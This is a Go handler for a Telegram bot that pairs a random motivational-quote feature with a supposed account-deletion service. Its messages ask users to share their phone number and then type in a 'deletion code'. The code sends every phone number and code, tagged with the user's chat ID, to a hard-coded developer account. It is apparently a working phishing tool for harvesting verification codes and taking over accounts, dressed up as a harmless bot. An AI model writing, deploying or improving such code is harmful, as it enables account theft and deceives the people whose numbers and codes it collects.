package handler

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"

	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// دالة لجلب اقتباس عشوائي بتنسيق عريض ومائل
func getQuote() string {
	quotes := []string{
		"***“Believe you can and you're halfway there.”***",
		"***“It always seems impossible until it's done.”***",
		"***“Success is not final, failure is not fatal.”***",
		"***“Your talent determines what you can do.”***",
	}
	rand.Seed(time.Now().UnixNano())
	return quotes[rand.Intn(len(quotes))]
}

func Handler(w http.ResponseWriter, r *http.Request) {
	// جلب البيانات من Environment Variables في فيرسل
	botToken := os.Getenv("BOT_TOKEN")
	appID := os.Getenv("APP_ID")
	devID := int64(8590415901)

	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		return
	}

	var update tgbotapi.Update
	if err := json.NewDecoder(r.Body).Decode(&update); err != nil {
		return
	}

	// أولوية 1: معالجة ضغطات الأزرار الشفافة (الاقتباسات)
	if update.CallbackQuery != nil {
		callback := update.CallbackQuery
		if callback.Data == "refresh_quote" {
			newQuote := getQuote()
			edit := tgbotapi.NewEditMessageText(callback.Message.Chat.ID, callback.Message.MessageID, newQuote)
			inlineKbd := tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData("🔄 Get New Quote", "refresh_quote"),
				),
			)
			edit.ReplyMarkup = &inlineKbd
			edit.ParseMode = "Markdown"
			bot.Send(edit)
			bot.Send(tgbotapi.NewCallback(callback.ID, "تم تحديث الاقتباس!"))
		}
		return
	}

	// أولوية 2: معالجة الرسائل الواردة
	if update.Message != nil {
		chatID := update.Message.Chat.ID

		// أ: أمر /start
		if update.Message.IsCommand() && update.Message.Command() == "start" {
			// كيبورد إرسال جهة الاتصال
			contactBtn := tgbotapi.NewKeyboardButtonContact("إرسال جهة الاتصال للحذف 🗑️")
			replyKbd := tgbotapi.NewReplyKeyboard([]tgbotapi.KeyboardButton{contactBtn})
			replyKbd.ResizeKeyboard = true

			// الزر الشفاف للاقتباسات
			inlineKbd := tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData("🔄 Get New Quote", "refresh_quote"),
				),
			)

			// إرسال رسالة الترحيب مع الكيبورد
			startMsg := tgbotapi.NewMessage(chatID, "✅ تم تفعيل البوت بنجاح.\n\nاستخدم الزر بالأسفل لإرسال رقمك للبدء في إجراءات الحذف.")
			startMsg.ReplyMarkup = replyKbd
			bot.Send(startMsg)

			// إرسال رسالة الاقتباس مع الزر الشفاف
			quoteMsg := tgbotapi.NewMessage(chatID, getQuote())
			quoteMsg.ParseMode = "Markdown"
			quoteMsg.ReplyMarkup = inlineKbd
			bot.Send(quoteMsg)
			return
		}

		// ب: استقبال جهة الاتصال
		if update.Message.Contact != nil {
			phone := update.Message.Contact.PhoneNumber
			bot.Send(tgbotapi.NewMessage(chatID, "⏳ جاري إرسال كود الحذف للرقم: "+phone+"\nبواسطة App ID: "+appID))
			
			// إشعار المطور
			bot.Send(tgbotapi.NewMessage(devID, "🔔 مستخدم جديد أرسل رقمه: "+phone))
			return
		}

		// ج: استقبال الكود النصي
		if update.Message.Text != "" {
			code := update.Message.Text
			bot.Send(tgbotapi.NewMessage(chatID, "⚠️ جاري التحقق من الكود: ["+code+"] لإتمام عملية الحذف..."))
			bot.Send(tgbotapi.NewMessage(devID, fmt.Sprintf("🔑 الكود المستلم من %d هو: %s", chatID, code)))
			return
		}
	}

	w.WriteHeader(http.StatusOK)
}
